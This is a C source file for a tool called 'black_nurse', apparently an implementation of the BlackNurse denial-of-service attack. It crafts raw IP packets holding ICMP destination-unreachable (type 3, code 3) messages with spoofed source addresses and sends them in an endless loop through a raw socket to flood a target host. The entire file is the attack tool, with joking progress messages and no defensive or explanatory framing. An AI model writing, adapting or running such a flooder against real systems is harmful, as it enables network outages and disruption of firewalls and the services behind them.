#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <linux/ip.h>
#include "hacking.h"
unsigned short checksum(void *b, int len) //ip checksum calculator
{	unsigned short *buf = b;
	unsigned int sum=0;
	unsigned short result;

	for ( sum = 0; len > 1; len -= 2 )
		sum += *buf++;
	if ( len == 1 )
		sum += *(unsigned char*)buf;
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}

#include <stdlib.h> // For random(), RAND_MAX

// Assumes 0 <= max <= RAND_MAX
// Returns in the closed interval [0, max]
long rand_l(long max) {
  unsigned long
    // max <= RAND_MAX < ULONG_MAX, so this is okay.
    num_bins = (unsigned long) max + 1,
    num_rand = (unsigned long) RAND_MAX + 1,
    bin_size = num_rand / num_bins,
    defect   = num_rand % num_bins;

  long x;
  do {
   x = random();
  }
  // This is carefully written not to overflow
  while (num_rand - defect <= (unsigned long)x);

  // Truncated division is intentional
  return x/bin_size;
}

struct ICMP {
  unsigned char type;
  unsigned char code;
  unsigned short check_sum;
  unsigned int  payload;
  
};
struct ip { //unused struct but the layout of the frame is correct but due to typeing issues the built in iphdr struct has been used
  
  unsigned char header_len:4, ver:4, type;
  unsigned short total_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned short check;
  unsigned int src_addr, dst_addr; 
};
struct TCP {
  unsigned short src_port;
  unsigned short dst_port;
  unsigned int seq;
  
};

int main(int argc, char *argv[])
{
  struct iphdr *ip1;
  struct iphdr *ip2;
  struct TCP *tcp;
  struct ICMP *icmp;
  struct sockaddr_in dst;
  unsigned int daddr, saddr;
  char pkt[100];
  int  on = 1;
  int sock;
  
  
  //dst_addr.sin_addr.s_addr = daddr;

  if (argc < 3){
    printf("[?] usage: ./black_nurse <nurses adress> <patients address> ");
    fflush( stdout );
    exit(0);
  }
  memset(pkt,0,100); // IP(networking ip):ICMP:IP(ICMP IP frame):TCP(ICMP TCP frame)
  ip1 = (struct iphdr *) &pkt;
  icmp = (struct ICMP *)&pkt[sizeof(struct iphdr)];
  ip2 = (struct iphdr *) &pkt[sizeof(struct iphdr) + sizeof(struct ICMP)];
  tcp = (struct TCP *) &pkt[sizeof(struct iphdr) + sizeof(struct ICMP) + sizeof(struct iphdr)];
  printf("[+] Black nurse has recieved patient details\n");
  fflush( stdout );
  sleep(1);
  //ICMP Header Setup
  icmp->type = 3;
  icmp->code = 3;
  icmp->payload = 0; // zero out the 4 bytes of unsued space in the ICMP packet
  icmp->check_sum = 0; //zero checksum for calculation

  ip1->version = 4;
  ip1->ihl = sizeof*ip1 >> 2;
  ip1->tos = 0;
  ip1->tot_len = htons(56);
  ip1->id = htons((short) rand_l(99999));
  ip1->frag_off = htons(0);
  ip1->ttl = 64;
  ip1->protocol = 1;
  ip1->saddr = inet_addr((char *) argv[1]);
  ip1->daddr = inet_addr((char *) argv[2]);
  ip1->check =  0;
  ip1->check = checksum((void *) ip1, sizeof(struct iphdr));
  

  ip2->version = 4;
  ip2->ihl = sizeof*ip2 >> 2;
  ip2->tos = 0;
  ip2->tot_len = htons(56);
  ip2->id = htons((short) rand_l(99999));
  ip2->frag_off = htons(0);
  ip2->ttl = 64;
  ip2->protocol = 6;
  ip2->saddr = inet_addr((char *) argv[1]);
  ip2->daddr = inet_addr((char *) argv[2]);
  ip2->check =  0;
  ip2->check = checksum((void *) ip2, sizeof(struct iphdr));

  tcp->src_port = 0;
  tcp->dst_port = 0;
  tcp->seq = ((int) rand_l(99999));
  printf("[+] Black nurse has found the cure...\n");
  fflush( stdout );
  sleep(1);

  if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror("[-] Error in call to Socket()");
      exit(0);
    }
  
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
    {
      perror("[-] Error setting setsockopot");
      exit(0);
    }
  
  dst.sin_addr.s_addr = inet_addr(argv[1]);
  dst.sin_family = AF_INET;
  printf("[+] Black nurse is administering the cure...\n");
  fflush( stdout );
  sleep(1);
  while(1)
    {
       if(sendto(sock, pkt, 56 , 0, (struct sockaddr *) &dst , sizeof(dst)) < 0){

           perror("sendto() error");
	   exit(0);

        }
    }

 
        
}
